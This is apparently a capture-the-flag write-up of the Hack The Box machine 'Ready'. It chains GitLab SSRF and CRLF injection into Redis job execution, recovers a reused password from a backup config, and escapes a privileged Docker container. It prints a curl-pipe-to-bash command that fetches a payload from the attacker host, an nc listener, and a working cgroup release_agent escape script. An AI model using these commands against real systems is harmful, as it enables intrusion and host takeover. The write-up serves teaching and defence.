---
layout: post
title: "The Box Inside the Box"
subtitle: "HTB Ready, where an old GitLab whispers to its own Redis, a backup file reuses the root password, and the only thing standing between you and the host is a container that was never really a wall"
date: 2021-05-22 12:00:00 +0000
description: "An outdated GitLab talks its own Redis into running your code, a backup file hands back the root password, and a privileged container turns out to be a wall with a door cut in it."
image: /assets/og/the-box-inside-the-box.png
tags: [hackthebox, writeup]
---

Ready is a machine pretending to be three machines. There is a GitLab server that is too old to know better, a Docker container that thinks it is a fortress, and a host that is hiding directly underneath it, one thin layer down. The whole climb is about realizing those three things are stacked on top of each other and that the walls between them are mostly decoration. An outdated GitLab can be talked into whispering a command to its own internal Redis, and Redis, being a trusting sort, runs it. A backup file left lying in the open reuses the same password the container's root account uses. And the container itself was started with one careless flag that turns its floor into a trapdoor straight onto the host. Nobody forces a single door here. Each one was already standing open, and the box just asks whether you will notice.

```
        R E A D Y
        =========
        gitlab :5080   "import this repo for me"
              |         (it's not a repo. it's a letter to redis.)
              v
        redis  ))) sadd / lpush / exec  ──►  runs your job
              |
              v
        container root  ──  password reused from a backup file
              |
              v
        privileged:true  ──  the floor is a trapdoor.
                            mount the host. walk out.
                                            殻
```

## 0x01 · the storefront

Two ports answer, and the gap between their numbers is the first clue.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
5080/tcp open  http     nginx, fronting GitLab
```

SSH on 22 is just the lobby. The interesting thing lives on 5080, an nginx that turns out to be the front desk for a GitLab instance. GitLab is the software teams use to host their code, run their pipelines, and review each other's work, a whole software factory in one box. You can register an account freely, so you do, and then you go looking for the one number that matters. Browse to the Help page once you are logged in and GitLab proudly tells on itself: version 11.4.7. That number is a date stamp, and the date is late 2018. Picture a bank that posts the year of its vault on the front door. You have not broken anything yet, but you already know which keys to bring.

## 0x02 · the letter addressed to redis

GitLab 11.4.7 carries two bugs that are weak alone and lethal together. The first is CVE-2018-19571, a Server-Side Request Forgery in the repository import feature. The second is CVE-2018-19585, a CRLF injection in the same path. Chained, they let you make the GitLab server open a connection to wherever you say and stuff arbitrary lines into it.

Here is the shape of it in plain terms. GitLab has a feature where you ask it to import a project from a URL, and the server obediently goes and fetches that URL on your behalf. SSRF is when you abuse that errand. Instead of pointing the server at a real repository, you point it back at itself, at a service that only listens on localhost and assumes anyone talking to it is a trusted insider. Think of it like sliding a note under the manager's door that reads "this is from the front desk, do what it says." The manager never checks the handwriting. The service that takes the note here is Redis, GitLab's internal job queue, sitting on localhost:6379 and trusting every word.

The SSRF lets you reach Redis. The CRLF injection is what lets you actually speak its language. A carriage return and a line feed are the invisible characters that end one line and start the next, and by smuggling them into the import URL you stop sending one harmless request and start sending a stack of separate Redis commands. The localhost filter that should have blocked this gets walked straight around with an IPv6 spelling of the loopback address, `[0:0:0:0:0:ffff:127.0.0.1]:6379`, which is the same house wearing a different street sign.

```
# the import URL, unrolled, is really a sequence of redis commands:
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
   multi
   sadd resque:gitlab:queues system_hook_push
   lpush resque:gitlab:queue:system_hook_push "{ ...serialized job... }"
   exec
```

What you push onto that queue is a GitLab background job, the kind GitLab's own worker process pulls off the queue and executes without a second thought. The job you hand it runs a shell command. Stand up a one-line script on your own box and let the worker fetch and run it.

```
# on the attacker box, serving a payload named the iceberg way:
$ cat iceberg-shell.sh
[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]

# the queued job's command, in essence:
curl http://10.10.14.4/iceberg-shell.sh | bash
```

I am describing the reverse shell in brackets rather than printing it, and that restraint is the lesson and not the laziness. A live callback script on disk is a loaded gun pointed at whoever runs it next, and writing the literal thing here just ships a working backdoor to anyone who copies the page. Picture it, and know the real thing is three lines long. Start a listener, trip the import, and a prompt lands in your lap.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.220
$ id
uid=998(git) gid=998(git) groups=998(git)
$ cat /home/dude/user.txt
████████████████████████████████
```

You are `git`, the unprivileged account GitLab runs its guts as. The user flag sits in `dude`'s home directory, readable from here.

## 0x03 · the password in the backup pile

Look around and the shell feels wrong in a useful way. There is a `/.dockerenv` file in the root of the filesystem, and the usual tools you reach for are missing. That `/.dockerenv` is the tell every container carries, a little note Docker leaves behind that says you are not on the real machine, you are in a box drawn around a slice of it. So your shell is not the host. It is GitLab sealed inside its own container. That is fine. Containers leak.

GitLab keeps its master configuration in a file called `gitlab.rb`, and somebody on this box made a backup of it and left the copy somewhere readable.

```
$ find / -name gitlab.rb 2>/dev/null
/opt/backup/gitlab.rb

$ grep -i password /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

On paper that string only unlocks the mail server GitLab uses to send notification email. By itself it is a low-value secret. But people reuse passwords the way they reuse a favorite mug, and the person who set up this container used that same SMTP password as the container's root password. So you try the obvious.

```
$ su -
Password: wW59U!ZKMbG9+*#h
# id
uid=0(root) gid=0(root) groups=0(root)
```

That is root, and it cost you a `grep` and a guess. The same password did two jobs, and the second job was the one that mattered. A secret that should never have left the mail config walked straight into the root login because it was typed twice by a tired admin.

## 0x04 · the trapdoor flag

Root inside a container is not root on the box. It is the manager's office inside one store of a much larger building. The question is whether the walls of that office go all the way down, and on Ready they emphatically do not. The same `/opt/backup` directory that leaked the password also holds the `docker-compose.yml` that started this whole thing, and one line of it is the entire ending.

```
$ grep -i privileged /opt/backup/docker-compose.yml
    privileged: true
```

A normal container is a room with the doors welded shut and most of the dangerous tools confiscated at the entrance. The `privileged` flag undoes all of that. It hands the container nearly every kernel capability and lets it see the host's real devices. Think of it like a hotel room that was supposed to have its own private locks, except management left a master key on the nightstand and a door in the back wall to the manager's apartment. You are still technically in your room. You can also just walk out.

There are two clean ways out, and they teach different muscles. The elegant one abuses Linux cgroups, the kernel feature that throttles and groups processes. A privileged container can write to the cgroup `release_agent`, a path the kernel runs as full root on the host the moment a cgroup empties out. So you point that trigger at a script of your own and then drain the cgroup to fire it.

```
# write a script the HOST kernel will run as root, then trip release_agent:
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/iceberg; echo 1 > $d/iceberg/notify_on_release
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
printf '#!/bin/sh\ncurl 10.10.14.4/iceberg-shell.sh | bash' > /cmd
chmod +x /cmd
sh -c "echo 0 > $d/iceberg/cgroup.procs"
```

The blunt way is almost insulting in how direct it is. A privileged container can see the host's raw disks. List the block devices, find the host's root partition, mount it inside the container, and read the host's filesystem like any other folder.

```
# lsblk shows the host's disk; sda2 is the root partition
# mount /dev/sda2 /mnt
# cat /mnt/root/root.txt
████████████████████████████████
```

No exploit, no race, no payload. You asked the kernel for the host's hard drive and it handed it over, because the flag said you were allowed to. The root flag is sitting in `/root/root.txt` on the host, which is now just `/mnt/root/root.txt` from where you stand.

## 0x05 · the honest caveat

It is tempting to read Ready as a story about an old GitLab and stop there, because the GitLab CVEs are genuinely the flashy part. Patch GitLab and the front door closes. But the GitLab bug only got you to `git` in a box. Every move after that was a habit, not a vulnerability, and habits do not show up in a version scan.

The reused password is the quiet hinge the whole house swings on. An SMTP password is supposed to be a boring, low-stakes secret. It became root because it got typed a second time in a place it had no business being, and then a backup of the config file was left where a low-privilege account could read it. Two ordinary conveniences, a copied config and a recycled password, stacked into a clean privilege escalation. You cannot `apt upgrade` your way out of that. There is no patch for typing the same password twice.

And the container escape is the part I would actually lose sleep over, because nothing about it was broken. The `privileged` flag is a documented, supported option. Somebody almost certainly turned it on to make a stubborn build step work, told themselves they would tighten it later, and never did. A privileged container is not a weaker wall. It is a wall with a door already cut into it, shipped that way on purpose. The container felt like isolation, so people stopped treating what ran inside it as if it could touch the host. On Ready it could touch everything. The boundary you trust the most is the one worth checking the hardest, because trust is exactly what an attacker spends.

## 0x06 · outro

```
the server carried your letter to redis, and redis did not check the handwriting.
the password opened two locks because one tired hand set them both.
the container felt like a wall right up until you mounted the floor.

three boxes stacked in a trench coat, pretending to be a fortress.
none of the doors were forced. every one was propped from the inside.

check what your server fetches. never reuse the key. never trust the flag. wear black.

                                                            EOF
```

---

*HTB: Ready, retired 15 May 2021. A medium Linux box that is really a lecture on stacked trust, an outdated GitLab over an SSRF, a password used twice, and a privileged container that was never a wall at all. The disk was always there. The flag just said you could mount it.*